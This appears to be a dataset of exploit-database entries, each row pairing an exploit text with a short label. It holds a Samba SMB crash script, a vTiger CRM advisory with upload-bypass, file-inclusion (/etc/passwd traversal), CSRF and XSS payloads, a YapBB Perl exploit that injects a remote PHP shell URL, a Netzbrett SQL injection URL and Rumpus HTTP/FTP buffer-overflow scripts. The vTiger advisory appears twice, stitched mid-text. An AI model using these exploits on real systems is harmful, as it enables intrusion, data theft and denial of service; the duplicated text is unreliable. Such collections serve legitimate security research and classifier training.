sys.argv[1],445  packetnego=( ""\x00\x00\x00\x85"" ""\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00"" ""\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50"" ""\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d"" ""\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66"" ""\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e"" ""\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"" ""\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20"" ""\x30\x2e\x31\x32\x00"" )  payload=( ""\x00\x00\x00\xec"" ""\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00"" ""\x0c\xff\x00\xec\x00\x04\x11\x32\x00\x00\x00\x00\x00\x00\x00"" ""\xff\xff""  ## Security blob set to \xff\xff here ""\x00\x00\x00\x00\xd4\x00\x00\xa0\xb1\x00\x60\x48\x06\x06\x2b"" ""\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b"" ""\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c"" ""\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x01\x28"" ""\x0a\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00"" ""\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00"" ""\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00"" ""\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x33\x00\x20\x00\x32\x00"" ""\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00"" ""\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00"" ""\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00\x00"" ) s = socket(AF_INET, SOCK_STREAM) s.connect(host)  s.send(''.join(packetnego)) s.send(''.join(payload))  Solution --------  Update to version 3.5.2 or 3.4.8 (http://samba.org/)   Response timeline -----------------  * 09/03/2010 - Null pointer dereference issue reported to vendor. * 09/03/2010 - Vendor acknowledges receipt of advisory 2 hours after                receiving the initial email * 09/03/2010 - Vendor confirms issue presence, and provide a patch 3                hours after receiving the initial email.  * 09/03/2010 - stratsec confirms patch resolves issue. * 15/03/2010 - Uninitialised Variable Read issue reported to vendor. * 15/03/2010 - Vendor confirms the issue and provides a patch 5 hours                after receiving the initial email. * 15/03/2010 - stratsec confirms patch resolves issue * 07/04/2010 - Version 3.5.2 released by the vendor fixing both issues. * 11/05/2010 - Version 3.4.8 released by the vendor fixing both issues. * 12/05/2010 - This advisory published.  References ---------- * Vendor advisory: http://samba.org/samba/history/samba-3.4.8.html  * https://bugzilla.samba.org/show_bug.cgi?id=7254 * stratsec would like to thanks the Samba Security Team for their    responsiveness while handling theses issues  ===============================================================================  About stratsec -------------- stratsec, specialises in providing information security consulting and testing services for government and commercial clients. Established in 2004, we are now one of the leading independent information security companies in the Australasian and SE-Asian region, with offices throughout Australia and in Singapore and Malaysia.   For more information, please visit our website at http://www.stratsec.net/   ===============================================================================",trigger a null pointer dereference or an uninitialized variable read,1
9450,"vTiger CRM 5.0.4 - Remote Code Execution / Cross-Site Request Forgery / Local File Inclusion / Cross-Site Scripting Vtiger CRM 5.0.4 Multiple Vulnerabilities   Name              Multiple Vulnerabilities in Vtiger CRM  Systems Affected  Vtiger CRM 5.0.4 and possibly earlier versions  Severity          Medium  Impact (CVSSv2)   Medium 6/10, vector: (AV:N/AC:M/Au:S/C:P/I:P/A:P)  Vendor            http://www.vtigercrm.com  Advisory http://www.ush.it/team/ush/hack-vtigercrm_504/vtigercrm_504.txt  Authors           Giovanni ""evilaliv3"" Pellerano (evilaliv3 AT ush DOT it)                    Antonio ""s4tan"" Parata (s4tan AT ush DOT it)                    Francesco ""ascii"" Ongaro (ascii AT ush DOT it)  Date              20090818  I. BACKGROUND  Vtiger CRM is a free, full-featured, 100% Open Source CRM software ideal for small and medium businesses, with low-cost product support available to production users that need reliable support.  II. DESCRIPTION  Multiple Vulnerabilities exist in Vtiger CRM software.  Some of the technical issues highlighted in this advisory are part of a wider publication, ""PHP filesystem attack vectors - Take Two"", and are generic to applications written in the PHP language: http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/  III. ANALYSIS  Summary:   A) Remote Code Execution (RCE) Vulnerability  B) Cross Site Request Forgery (CSRF) Vulnerabilities  C) Local File Inclusion (LFI) Vulnerability  D) Cross Side Scripting (XSS) Vulnerability  A) Remote Code Execution (Windows Only) Vulnerability  A Remote Code Execution vulnerability exists in Vtiger CRM version 5.0.4. In order to exploit this vulnerability an account on the CRM system is required.  The vulnerability resides in the ""Compose Mail"" section. The software permits sending email with attachments and offers a draft save feature. When this feature is requested and an attachment is specified, the ""saveForwardAttachments"" validation routine is called.  This routine involves some security checks to handle uploaded files, it does blacklist extension checking and if a bad extension is detected the txt extension is appended to the file-name.  The following is the specific section:  --8<--8<--8<--8<--8<--8<--8<-Vtiger CRM 5.0.4 Multiple Vulnerabilities   Name              Multiple Vulnerabilities in Vtiger CRM  Systems Affected  Vtiger CRM 5.0.4 and possibly earlier versions  Severity          Medium  Impact (CVSSv2)   Medium 6/10, vector: (AV:N/AC:M/Au:S/C:P/I:P/A:P)  Vendor            http://www.vtigercrm.com  Advisory  Authors           Giovanni ""evilaliv3"" Pellerano (evilaliv3 AT ush DOT it)                    Antonio ""s4tan"" Parata (s4tan AT ush DOT it)                    Francesco ""ascii"" Ongaro (ascii AT ush DOT it)  Date              20090818  I. BACKGROUND  Vtiger CRM is a free, full-featured, 100% Open Source CRM software ideal for small and medium businesses, with low-cost product support available to production users that need reliable support.  II. DESCRIPTION  Multiple Vulnerabilities exist in Vtiger CRM software.  Some of the technical issues highlighted in this advisory are part of a wider publication, ""PHP filesystem attack vectors - Take Two"", and are generic to applications written in the PHP language: http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/  III. ANALYSIS  Summary:   A) Remote Code Execution (RCE) Vulnerability  B) Cross Site Request Forgery (CSRF) Vulnerabilities  C) Local File Inclusion (LFI) Vulnerability  D) Cross Side Scripting (XSS) Vulnerability  A) Remote Code Execution (Windows Only) Vulnerability  A Remote Code Execution vulnerability exists in Vtiger CRM version 5.0.4. In order to exploit this vulnerability an account on the CRM system is required.  The vulnerability resides in the ""Compose Mail"" section. The software permits sending email with attachments and offers a draft save feature. When this feature is requested and an attachment is specified, the ""saveForwardAttachments"" validation routine is called.  This routine involves some security checks to handle uploaded files, it does blacklist extension checking and if a bad extension is detected the txt extension is appended to the file-name.  The following is the specific section:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  $ext_pos = strrpos($binFile, "".""); $ext = substr($binFile, $ext_pos + 1); if (in_array(strtolower($ext), $upload_badext)) {     $binFile .= "".txt""; }  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  It's known that in some circostances (for example when the PHP handler is configured using AddType/Action/AddHandler globally, eg. not inside an Apache's Files/FilesMatch directive) blacklisting is not enough as files in the form of ""filename.php.foo"" will be mapped back to PHP anyway (since foo is not explicitly defined in the MIME map and Apache will try to guess the filetype by its own).  Beside this known issue we want to point out a less known exploitation methodology that works on Windows hosts.  First the attacker has to find the name of the file that was uploaded in the attachment list files. Vtiger CRM saves files in a path like:  storage/2009/July/week1/  And prepends an incremental unique number to the filename like:  133_foo.php  So, a hypothetical attacker has only to guess the prepended number. This can be done by bruteforcing or by requesting the url:  http://127.0.0.1/vtigercrm/index.php?module=Emails&action=ListView  At this page Vtiger CRM shows the list of all the emails sent and saved, and for every email it allows to download the attachment showing its unique id in the link.  http://127.0.0.1/vtigercrm/index.php?module=uploads&action=downloadfile& return_module=Emails&fileid=133&entityid=136  So, finally, the link to exploit this vulnerability should be something like:  http://127.0.0.1/vtigercrm/storage/2009/July/week1/133.foo.php  While Vtiger CRM blocks known dangerous extensions (like .php) making direct exploitation impossible it has to be highlighted that this simple estension check is totally improper since it does not consider specific filenames and behaviours of the operating systems where Vtiger CRM is deployed.  For example on Windows OS is possible to exploit this vulnerability by requesting an upload with the filename ""foo.php."".  This string will bypass the check and since Windows does not permit filenames ending with a dot, modifying it in a transparent way, the final name of the file will simply be ""foo.php."".  A similar result can be obtained on GNU/Linux by requesting an upload with the filename ""foo.php/.""  Note that the integrated webmail feature that allows a user to write emails and eventually save a draft of them is authenticated (a valid user on the system is required in order to exploit this vulnerability).  B) Multiple CSRF (Cross Site Request Forgery) Vulnerabilites  Multiple CSRF vulnerabilities exist in vtiger crm version 5.0.4. Here's a demonstrative one (an Admin user has to follow this link):  http://127.0.0.1/vtigercrm/index.php?module=Rss&action=Save&rssurl=http: //www.ush.it/feed  The feed is added to the news feed system visible by the crm users.  Other and more dangerous CSRF vulnerabilities exist.  C) Local File Inclusion  Some LFI vulnerabilities exist in Vtiger CRM version 5.0.4.  Some examples:  1) http://127.0.0.1/vtigercrm/graph.php?module=/../[..]/../etc/passwd%00 2) http://127.0.0.1/vtigercrm/index.php?module=Accounts&action=Import&pa renttab=Support&step=/../[..]/../etc/passwd%00  Add as many ""../"" instead of the ""[..]"" placeholder as needed.  The first one does not need a valid user account, the second one is authenticated.  Other modules are vulnerable to LFI, for example those who include ""Import/index.php"" where the vulnerability resides:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  grep ""Import/index.php"" * -R  modules/Accounts/Import.php: include('modules/Import/index.php'); modules/Contacts/Import.php: include('modules/Import/index.php'); modules/HelpDesk/Import.php: include('modules/Import/index.php'); modules/Leads/Import.php: include('modules/Import/index.php'); modules/Potentials/Import.php: include('modules/Import/index.php'); modules/Products/Import.php: include('modules/Import/index.php'); modules/Vendors/Import.php: include('modules/Import/index.php');  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  A third LFI vulnerability has been found in ""CommonAjax.php"", both ""module"" and ""file"" parameters are vulnerable.  http://127.0.0.1/vtigercrm/include/Ajax/CommonAjax.php?module=Email&file=bar  Will lead to a call like ""require_once(modules/Email/bar.php)"".  If direct access to ""CommonAjax.php"" has been forbidden other entry points can be used:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  grep ""Ajax/CommonAjax.php"" * -R modules/Campaigns/CampaignsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/SalesOrder/SalesOrderAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/System/SystemAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Products/ProductsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/uploads/uploadsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Dashboard/DashboardAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Potentials/PotentialsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Notes/NotesAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Faq/FaqAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Quotes/QuotesAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Utilities/UtilitiesAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Calendar/ActivityAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Calendar/CalendarAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/PurchaseOrder/PurchaseOrderAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/HelpDesk/HelpDeskAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Invoice/InvoiceAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Accounts/AccountsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Reports/ReportsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Contacts/ContactsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Portal/PortalAjax.php: require_once('include/Ajax/CommonAjax.php');  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  To use one of these files as gateway for the previous vulnerability issue a request like the following:  http://127.0.0.1/vtigercrm/?module=Invoice&action=InvoiceAjax&file=bar  Where ""Invoice"" and ""InvoiceAjax"" are values from the presented list.  This LFI vulnerability is not exploitable if you have applied a separate patch available at the following url:  https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.0.4%20 Latest%20Stable/VtigerCRM504_Security_Patch.zip  We question ourself about the usefulness of such patch without a proper release. Probably little or no Vtiger CRM customers have applied such patch.  D) Cross Side Scripting vulnerabilites  Some XSS vulnerabilities exist in Vtiger CRM version 5.0.4.  For example:  http://127.0.0.1/vtigercrm/phprint.php?module=Activities&action=--%3E%3C script%3Ealert(%22ush.it%22);%3C/script%3E%3C!--  Or:  http://127.0.0.1/vtigercrm/index.php?action=UnifiedSearch&module=Home&pa renttab=My+Home+Page&query_string=%27%22%3E%3Cscript%3Ealert(123)%3C/scr ipt%3E  IV. DETECTION  Vtiger CRM 5.0.4 and possibly earlier versions are vulnerable.  V. WORKAROUND  Upgrade to latest version 5.1.0.  VI. VENDOR RESPONSE  ""Our team reviewed the issues reported against current development build (version 5.1.0) and seem to have addressed many of them already. In this version we have made several improvements to performance and closed loop holes reported on 5.0.4 with lot more features.  Please let me know if you need further clarification. Thank you for your support once again.""  VII. CVE INFORMATION  No CVE at this time.  VIII. DISCLOSURE TIMELINE  20090620 Bug discovered 20090706 First vendor contact 20090706 Vendor Response 20090706 Vendor Confirm the vulnerability 20090713 Vendor propose a possible fix and path release 20090722 Vendor released VtigerCRM 5.1.0 (Vulnerability fixed) 20090818 Advisory released  IX. CREDIT  Giovanni ""evilaliv3"" Pellerano, Antonio ""s4tan"" Parata and Francesco ""ascii"" Ongaro are credited with the discovery of this vulnerability.  Giovanni ""evilaliv3"" Pellerano web site: http://www.ush.it/, http://www.evilaliv3.org/ mail: evilaliv3 AT ush DOT it  Antonio ""s4tan"" Parata web site: http://www.ush.it/ mail: s4tan AT ush DOT it  Francesco ""ascii"" Ongaro web site: http://www.ush.it/ mail: ascii AT ush DOT it  X. LEGAL NOTICES  Copyright (c) 2009 Francesco ""ascii"" Ongaro  Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without mine express written consent. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission.  Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  -8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  $ext_pos = strrpos($binFile, "".""); $ext = substr($binFile, $ext_pos + 1); if (in_array(strtolower($ext), $upload_badext)) {     $binFile .= "".txt""; }  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  It's known that in some circostances (for example when the PHP handler is configured using AddType/Action/AddHandler globally, eg. not inside an Apache's Files/FilesMatch directive) blacklisting is not enough as files in the form of ""filename.php.foo"" will be mapped back to PHP anyway (since foo is not explicitly defined in the MIME map and Apache will try to guess the filetype by its own).  Beside this known issue we want to point out a less known exploitation methodology that works on Windows hosts.  First the attacker has to find the name of the file that was uploaded in the attachment list files. Vtiger CRM saves files in a path like:  storage/2009/July/week1/  And prepends an incremental unique number to the filename like:  133_foo.php  So, a hypothetical attacker has only to guess the prepended number. This can be done by bruteforcing or by requesting the url:  http://127.0.0.1/vtigercrm/index.php?module=Emails&action=ListView  At this page Vtiger CRM shows the list of all the emails sent and saved, and for every email it allows to download the attachment showing its unique id in the link.  http://127.0.0.1/vtigercrm/index.php?module=uploads&action=downloadfile& return_module=Emails&fileid=133&entityid=136  So, finally, the link to exploit this vulnerability should be something like:  http://127.0.0.1/vtigercrm/storage/2009/July/week1/133.foo.php  While Vtiger CRM blocks known dangerous extensions (like .php) making direct exploitation impossible it has to be highlighted that this simple estension check is totally improper since it does not consider specific filenames and behaviours of the operating systems where Vtiger CRM is deployed.  For example on Windows OS is possible to exploit this vulnerability by requesting an upload with the filename ""foo.php."".  This string will bypass the check and since Windows does not permit filenames ending with a dot, modifying it in a transparent way, the final name of the file will simply be ""foo.php."".  A similar result can be obtained on GNU/Linux by requesting an upload with the filename ""foo.php/.""  Note that the integrated webmail feature that allows a user to write emails and eventually save a draft of them is authenticated (a valid user on the system is required in order to exploit this vulnerability).  B) Multiple CSRF (Cross Site Request Forgery) Vulnerabilites  Multiple CSRF vulnerabilities exist in vtiger crm version 5.0.4. Here's a demonstrative one (an Admin user has to follow this link):  http://127.0.0.1/vtigercrm/index.php?module=Rss&action=Save&rssurl=http: //www.ush.it/feed  The feed is added to the news feed system visible by the crm users.  Other and more dangerous CSRF vulnerabilities exist.  C) Local File Inclusion  Some LFI vulnerabilities exist in Vtiger CRM version 5.0.4.  Some examples:  1) http://127.0.0.1/vtigercrm/graph.php?module=/../[..]/../etc/passwd%00 2) http://127.0.0.1/vtigercrm/index.php?module=Accounts&action=Import&pa renttab=Support&step=/../[..]/../etc/passwd%00  Add as many ""../"" instead of the ""[..]"" placeholder as needed.  The first one does not need a valid user account, the second one is authenticated.  Other modules are vulnerable to LFI, for example those who include ""Import/index.php"" where the vulnerability resides:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  grep ""Import/index.php"" * -R  modules/Accounts/Import.php: include('modules/Import/index.php'); modules/Contacts/Import.php: include('modules/Import/index.php'); modules/HelpDesk/Import.php: include('modules/Import/index.php'); modules/Leads/Import.php: include('modules/Import/index.php'); modules/Potentials/Import.php: include('modules/Import/index.php'); modules/Products/Import.php: include('modules/Import/index.php'); modules/Vendors/Import.php: include('modules/Import/index.php');  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  A third LFI vulnerability has been found in ""CommonAjax.php"", both ""module"" and ""file"" parameters are vulnerable.  http://127.0.0.1/vtigercrm/include/Ajax/CommonAjax.php?module=Email&file=bar  Will lead to a call like ""require_once(modules/Email/bar.php)"".  If direct access to ""CommonAjax.php"" has been forbidden other entry points can be used:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  grep ""Ajax/CommonAjax.php"" * -R modules/Campaigns/CampaignsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/SalesOrder/SalesOrderAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/System/SystemAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Products/ProductsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/uploads/uploadsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Dashboard/DashboardAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Potentials/PotentialsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Notes/NotesAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Faq/FaqAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Quotes/QuotesAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Utilities/UtilitiesAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Calendar/ActivityAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Calendar/CalendarAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/PurchaseOrder/PurchaseOrderAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/HelpDesk/HelpDeskAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Invoice/InvoiceAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Accounts/AccountsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Reports/ReportsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Contacts/ContactsAjax.php: require_once('include/Ajax/CommonAjax.php'); modules/Portal/PortalAjax.php: require_once('include/Ajax/CommonAjax.php');  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  To use one of these files as gateway for the previous vulnerability issue a request like the following:  http://127.0.0.1/vtigercrm/?module=Invoice&action=InvoiceAjax&file=bar  Where ""Invoice"" and ""InvoiceAjax"" are values from the presented list.  This LFI vulnerability is not exploitable if you have applied a separate patch available at the following url:  https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.0.4%20 Latest%20Stable/VtigerCRM504_Security_Patch.zip  We question ourself about the usefulness of such patch without a proper release. Probably little or no Vtiger CRM customers have applied such patch.  D) Cross Side Scripting vulnerabilites  Some XSS vulnerabilities exist in Vtiger CRM version 5.0.4.  For example:  http://127.0.0.1/vtigercrm/phprint.php?module=Activities&action=--%3E%3C script%3Ealert(%22ush.it%22);%3C/script%3E%3C!--  Or:  http://127.0.0.1/vtigercrm/index.php?action=UnifiedSearch&module=Home&pa renttab=My+Home+Page&query_string=%27%22%3E%3Cscript%3Ealert(123)%3C/scr ipt%3E  IV. DETECTION  Vtiger CRM 5.0.4 and possibly earlier versions are vulnerable.  V. WORKAROUND  Upgrade to latest version 5.1.0.  VI. VENDOR RESPONSE  ""Our team reviewed the issues reported against current development build (version 5.1.0) and seem to have addressed many of them already. In this version we have made several improvements to performance and closed loop holes reported on 5.0.4 with lot more features.  Please let me know if you need further clarification. Thank you for your support once again.""  VII. CVE INFORMATION  No CVE at this time.  VIII. DISCLOSURE TIMELINE  20090620 Bug discovered 20090706 First vendor contact 20090706 Vendor Response 20090706 Vendor Confirm the vulnerability 20090713 Vendor propose a possible fix and path release 20090722 Vendor released VtigerCRM 5.1.0 (Vulnerability fixed) 20090818 Advisory released  IX. CREDIT  Giovanni ""evilaliv3"" Pellerano, Antonio ""s4tan"" Parata and Francesco ""ascii"" Ongaro are credited with the discovery of this vulnerability.  Giovanni ""evilaliv3"" Pellerano web site: http://www.ush.it/, http://www.evilaliv3.org/ mail: evilaliv3 AT ush DOT it  Antonio ""s4tan"" Parata web site: http://www.ush.it/ mail: s4tan AT ush DOT it  Francesco ""ascii"" Ongaro web site: http://www.ush.it/ mail: ascii AT ush DOT it  X. LEGAL NOTICES  Copyright (c) 2009 Francesco ""ascii"" Ongaro  Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without mine express written consent. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission.  Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  # milw0rm.com [2009-08-18]",Code Execution,1
1503,"YapBB 1.2 - 'cfgIncludeDirectory' Remote Command Execution #!/usr/bin/perl # # YapBB <=1.2 Beta Remote Command Execution Exploit # # Copyright (c) 2006 cijfer <cijfer@netti!fi> # All rights reserved. # # never ctrl+c again. # cijfer$ http://target.com/dir # host changed to 'http://target.com/dir' # cijfer$  # # to set your PHP shell location: # cijfer$ shell=http://my.shell.fi/phpshell.gif?&cmd= # php shell set to 'http://my.shell.fi/phpshell.gif?&cmd=' # cijfer$ # # $Id: cijfer-yapbbxpl.pl,v 0.1 2006/02/15 02:37:00 cijfer Exp $  use LWP::UserAgent; use URI::Escape; use Getopt::Long; use Term::ANSIColor;  $res  = GetOptions(""host=s"" => \$host, ""proxy=s"" => \$proxy, ""verbose+"" => \$verbose); &usage unless $host;  while() { 	print color(""green""), ""cijfer\$ "", color(""reset""); 	chomp($command = <STDIN>); 	exit unless $command; 	if($command =~ m/^http:\/\/(.*)/g) 	{ 		$host=""http://"".$1; 		print ""host changed to '""; 		print color(""bold""), $host.""'\n"", color(""reset""); 	} 	elsif($command =~ m/^shell=http:\/\/(.*)/g) 	{ 		$shel=""http://"".$1; 		print ""php shell set to '""; 		print color(""bold""), $shel.""'\n"", color(""reset""); 	} 	else 	{ 		&exploit($command,$host); 	} }  sub usage { 	print ""YapBB <=1.2 Beta Remote Command Execution Exploit\n""; 	print ""usage: $0 -hpv\n\n""; 	print ""  -h, --host\t\tfull address of target (ex. http://www.website.com/directory)\n""; 	print ""  -p, --proxy\t\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n""; 	print ""  -v, --verbose\t\tverbose mode (debug)\n\n""; 	exit; }  sub exploit { 	my($command,$host) = @_;  	$cij=LWP::UserAgent->new() or die; 	$cij->agent(""Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101""); 	$cij->proxy(""http"", ""http://"".$proxy.""/"") unless !$proxy;  	$string  = ""%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B""; 	$string .= uri_escape(shift); 	$string .= ""%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F"";  	$out=$cij->get($host.""/include/global.php?GLOBALS[includeBit]=1&cfgIncludeDirectory="".$shel.$string);  	if($out->is_success) 	{ 		@cij=split(""_cijfer_"",$out->content); 		print substr(@cij[1],1); 	}  	if($verbose) 	{ 		$recv=length $out->content; 		print ""Total received bytes: "".$recv.""\n""; 		$sent=length $command; 		print ""Total sent bytes: "".$sent.""\n""; 	} }  # milw0rm.com [2006-02-16]",Command Execution,1
26629,"Netzbrett 1.5.1 - 'P_Entry' SQL Injection source: https://www.securityfocus.com/bid/15593/info  Netzbrett is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  /index.php?p_lng=en&p_days=15&p_cmd=entry&p_entry=1[SQL]",exploit vulnerabilities in the underlying database implementation,1
7314,"Maxum Rumpus 6.0 - Multiple Remote Buffer Overflow Vulnerabilities BLUE MOON SECURITY ADVISORY 2008-09 ===================================   :Title: Two buffer overflows in Maxum Rumpus :Severity: Critical :Reporter: Blue Moon Consulting :Products: Maxum Rumpus v6.0 :Fixed in: 6.0.1   Description -----------  Rumpus turns any Mac into a file transfer server.  Rumpus v6.0 contains two buffer overflow vulnerabilities in its HTTP and FTP modules.  The first allows an unauthenticated user to crash Rumpus. The later may result in arbitrary  code execution under superuser privilege.  The overflow in HTTP component is caused by the lack of boundary check when parsing for HTTP  action verb (GET, POST, PUT, etc.). If the verb is exactly 2908-byte long, the server runs into  a segmentation fault and crashes. A manual restart is required. It has been observed that this  problem occurs at other verb lengths too. The vulnerability is rated at moderate severity for the  lost of service.  The overflow in FTP component is also caused by the lack of length check when parsing FTP commands  that take argument such as ``MKD``, ``XMKD``, ``RMD`` and so on. The overflow occurs when the argument  is ``strcpy`` to an internal buffer. This buffer is 1024-byte long. When the passed-in argument is  longer than 1046 bytes, the instruction pointer will be overwritten. This allows a successful attack  to run arbitrary code under the privilege of a superuser (root) by default. Though authorization is  required to exploit this security bug, the vulnerability is rated at critical severity because the FTP  daemon could be allowing anonymous access.  Workaround ----------  There is no workaround the first bug.  Disable ANONYMOUS and only allow trusted users to use FTP.  Fix ---  Maxum has released Rumpus v6.0.1 which addressed these bugs.  Disclosure ----------  Blue Moon Consulting adapts `RFPolicy v2.0 <http://www.wiretrip.net/rfp/policy.html>`_ in notifying vendors.  :Initial vendor contact:    November 28, 2008: Initial contact sent to support@maxum.com  :Vendor response:    November 28, 2008: John requested further communications to be sent to the same address.  :Further communication:    November 28, 2008: Technical details and request for regular update of a patch sent to the vendor.    November 29, 2008: Vendor thanked for the bug report and planned to release v6.0.1 on Monday, December 01.    December 01, 2008: Vendor released 6.0.1 and posted release note at http://www.maxum.com/Rumpus/News601.html.  :Public disclosure: December 01, 2008  :Exploit code:  For the vulnerability in HTTP component::    from socket import socket, AF_INET, SOCK_STREAM    host = ""192.168.1.12""   port = 80    s = socket(AF_INET, SOCK_STREAM)   s.connect((host, port))   s.send('z' * 2908 + '\n\n')   s.recv(1024)   s.close()  For the vulnerability in FTP component::    from socket import socket, AF_INET, SOCK_STREAM      host = ""192.168.1.12""   port = 21   user = ""regular""   pass_ = ""training""      commands = [   	'user regular\n',   	'pass training\n',   	'mkd ' + 'z' * 1046 + 'abcd\n'   ]      s = socket(AF_INET, SOCK_STREAM)   s.connect((host, port))   s.recv(1024)   for line in commands:   	s.send(line)   	s.recv(1024)   s.close()  Disclaimer ----------  The information provided in this advisory is provided ""as is"" without warranty of any kind. Blue Moon Consulting Co., Ltd  disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular  purpose. Your use of the information on the advisory or materials linked from the advisory is at your own risk. Blue Moon Consulting Co., Ltd  reserves the right to change or update this notice at any time.  # milw0rm.com [2008-12-01]",arbitrary code execution under superuser privilege,1
